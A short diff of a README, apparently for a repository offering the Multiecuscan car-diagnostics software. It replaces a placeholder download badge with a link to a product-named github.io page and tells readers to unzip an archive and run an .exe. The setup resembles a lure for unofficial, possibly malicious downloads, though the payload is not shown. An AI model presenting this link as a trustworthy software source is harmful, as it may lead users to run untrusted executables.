@@ -13,7 +13,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to start the application.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://multiecuscan-download.github.io/.github/)
 
 ## 📸 Overview
 ![multiecuscan-obd2](https://github.com/user-attachments/assets/5bd2fa87-431e-4745-9f5e-d5f1cfc4a0cb)
